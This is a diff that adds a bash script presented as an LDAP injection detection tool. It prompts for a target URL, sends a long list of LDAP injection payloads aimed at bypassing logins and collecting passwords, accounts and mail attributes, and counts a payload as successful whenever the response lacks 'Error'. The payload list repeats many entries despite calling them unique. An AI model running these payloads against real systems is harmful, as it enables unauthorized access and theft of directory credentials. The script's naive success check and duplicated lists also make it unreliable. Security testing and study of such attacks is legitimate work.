@@ -1,0 +1,272 @@
+#!/bin/bash
+# This is a comment
+
+# Color codes
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+NC='\033[0m' # No Color
+
+# Function to perform LDAP Injection detection
+detect_ldap_injection() {
+    echo -e "${GREEN}Detecting LDAP Injection vulnerabilities...${NC}"
+    # Define LDAP Injection payloads for injection and sensitive information collection
+    payloads=(
+        ")(|(username=*)(password=*))" 
+        "(&(objectClass=user)(sAMAccountName=*)(memberOf=*))" 
+        "*)(|(password=*))(|(password=*" 
+        "*))(|(password=*))"
+        "*)(objectclass=*)" 
+        "(|(uid=*))" 
+        "*))(|(uid=*" 
+        "*/(objectclass=*"
+        "*(uid=*"
+        "*(uid=*)" 
+        "(uid=*))" 
+        "(uid=*))"
+        "*(objectclass=*)" 
+        "*(uid=*))" 
+        "(sn=*))" 
+        "(sn=*))"
+        "(|(sn=*))" 
+        "(|(sn=*))"
+        "*(sn=*))" 
+        "*(sn=*))"
+        "(sn=*))"
+        "(cn=*)" 
+        "(cn=*))"
+        "*(cn=*)" 
+        "*(cn=*))"
+        "(objectclass=*)" 
+        "(objectclass=*))"
+        "*(objectclass=*)" 
+        "*(objectclass=*))"
+        "*(objectclass=*"
+        "(objectclass=*" 
+        "(objectclass=*))"
+        "(uid=*)" 
+        "(uid=*))"
+        "*(uid=*)" 
+        "*(uid=*))"
+        "(mail=*@*)" 
+        "(mail=*@*))" 
+        "*(mail=*@*)" 
+        "*(mail=*@*))" 
+        "(userPassword=*)" 
+        "(userPassword=*))"
+        "*(userPassword=*)" 
+        "*(userPassword=*))"
+        "(userPassword=*" 
+        "(userPassword=*))"
+        "*(userPassword=*" 
+        "*(userPassword=*))"
+        "(userPassword=*)))" 
+        "*(userPassword=*)))"
+        # Additional 100 unique payloads for sensitive information collection
+        "(uid=admin))"
+        "(cn=admin))"
+        "(sAMAccountName=admin))"
+        "(objectClass=admin))"
+        "(password=admin))"
+        "(userPassword=admin))"
+        "(mail=admin))"
+        "(sn=admin))"
+        "(uid=system))"
+        "(cn=system))"
+        "(sAMAccountName=system))"
+        "(objectClass=system))"
+        "(password=system))"
+        "(userPassword=system))"
+        "(mail=system))"
+        "(sn=system))"
+        "(uid=root))"
+        "(cn=root))"
+        "(sAMAccountName=root))"
+        "(objectClass=root))"
+        "(password=root))"
+        "(userPassword=root))"
+        "(mail=root))"
+        "(sn=root))"
+        "(uid=administrator))"
+        "(cn=administrator))"
+        "(sAMAccountName=administrator))"
+        "(objectClass=administrator))"
+        "(password=administrator))"
+        "(userPassword=administrator))"
+        "(mail=administrator))"
+        "(sn=administrator))"
+        "(uid=admin))"
+        "(cn=admin))"
+        "(sAMAccountName=admin))"
+        "(objectClass=admin))"
+        "(password=admin))"
+        "(userPassword=admin))"
+        "(mail=admin))"
+        "(sn=admin))"
+        "(uid=test))"
+        "(cn=test))"
+        "(sAMAccountName=test))"
+        "(objectClass=test))"
+        "(password=test))"
+        "(userPassword=test))"
+        "(mail=test))"
+        "(sn=test))"
+        "(uid=backup))"
+        "(cn=backup))"
+        "(sAMAccountName=backup))"
+        "(objectClass=backup))"
+        "(password=backup))"
+        "(userPassword=backup))"
+        "(mail=backup))"
+        "(sn=backup))"
+        "(uid=service))"
+        "(cn=service))"
+        "(sAMAccountName=service))"
+        "(objectClass=service))"
+        "(password=service))"
+        "(userPassword=service))"
+        "(mail=service))"
+        "(sn=service))"
+        "(uid=web))"
+        "(cn=web))"
+        "(sAMAccountName=web))"
+        "(objectClass=web))"
+        "(password=web))"
+        "(userPassword=web))"
+        "(mail=web))"
+        "(sn=web))"
+        "(uid=info))"
+        "(cn=info))"
+        "(sAMAccountName=info))"
+        "(objectClass=info))"
+        "(password=info))"
+        "(userPassword=info))"
+        "(mail=info))"
+        "(sn=info))"
+        "(uid=root))"
+        "(uid=manager))"
+        "(uid=dba))"
+        "(uid=webmaster))"
+        "(uid=developer))"
+        "(uid=sysadmin))"
+        "(uid=appadmin))"
+        "(uid=admin1))"
+        "(uid=admin2))"
+        "(uid=admin3))"
+        "(uid=superuser))"
+        "(uid=administrator))"
+        "(uid=user1))"
+        "(uid=user2))"
+        "(uid=user3))"
+        "(uid=testuser))"
+        "(uid=guest))"
+        "(uid=owner))"
+        "(uid=operator))"
+        "(uid=monitor))"
+        "(uid=service))"
+        "(uid=backup))"
+        "(uid=ftp))"
+        "(uid=apache))"
+        "(uid=nginx))"
+        "(uid=www))"
+        "(uid=www-data))"
+        "(uid=apache2))"
+        "(uid=www-data2))"
+        "(uid=wwwadmin))"
+        "(uid=mailadmin))"
+        "(uid=webadmin))"
+        "(uid=sqladmin))"
+        "(uid=dbadmin))"
+        "(uid=admin4))"
+        "(uid=admin5))"
+        "(uid=admin6))"
+        "(uid=admin7))"
+        "(uid=admin8))"
+        "(uid=admin9))"
+        "(uid=admin10))"
+        "(uid=systemadmin))"
+        "(uid=cloudadmin))"
+        "(uid=devops))"
+        "(uid=noc))"
+        "(uid=ops))"
+        "(uid=security))"
+        "(uid=audit))"
+        "(uid=network))"
+        "(uid=router))"
+        "(uid=switch))"
+        "(uid=firewall))"
+        "(uid=printer))"
+        "(uid=scanner))"
+        "(uid=monitoring))"
+        "(uid=server))"
+        "(uid=workstation))"
+        "(uid=desktop))"
+        "(uid=laptop))"
+        "(uid=tablet))"
+        "(uid=phone))"
+        "(uid=android))"
+        "(uid=iphone))"
+        "(uid=smartphone))"
+        "(uid=desktop1))"
+        "(uid=desktop2))"
+        "(uid=desktop3))"
+        "(uid=laptop1))"
+        "(uid=laptop2))"
+        "(uid=laptop3))"
+        "(uid=mobile1))"
+        "(uid=mobile2))"
+        "(uid=mobile3))"
+    )
+
+    # Iterate over payloads and inject them into vulnerable parameters
+    for payload in "${payloads[@]}"; do
+        echo -e "${GREEN}Payload: $payload${NC}"
+
+        # Generate URL with payload
+        url_with_payload="$1?username=user&password=$payload"
+
+        # Display URL with payload
+        echo -e "${YELLOW}URL with Payload:${NC} $url_with_payload"
+
+        # Execute HTTP request and capture response
+        response=$(curl -s -d "username=user&password=$payload" -X POST "$1")
+        
+        # Display how response was found
+        echo -e "${YELLOW}How Found Response:${NC} The response was obtained by injecting the payload into the URL"
+
+        # Display response content
+        echo -e "${YELLOW}Response:${NC}"
+        echo "$response"
+
+        # Analyze response
+        if grep -q "Error" <<< "$response"; then
+            echo -e "${RED}Payload failed:${NC} $payload"
+            echo -e "${RED}Reason:${NC} Error found in response"
+        else
+            echo -e "${GREEN}Payload successful:${NC} $payload"
+        fi
+
+        echo ""
+    done
+}
+
+# Main function
+main() {
+    echo -e "${GREEN}LDAP Injection Detection Tool${NC}"
+    echo -e "${GREEN}-----------------------------${NC}"
+
+    # Prompt user to enter target URL
+    read -p "$(echo -e ${RED}"Enter your target URL: "${NC})" target_url
+
+    # Validate input
+    if [ -z "$target_url" ]; then
+        echo -e "${RED}Target URL cannot be empty.${NC}"
+        exit 1
+    fi
+
+    # Perform LDAP Injection detection
+    detect_ldap_injection "$target_url"
+}
+
+# Call main function
+main "$@"
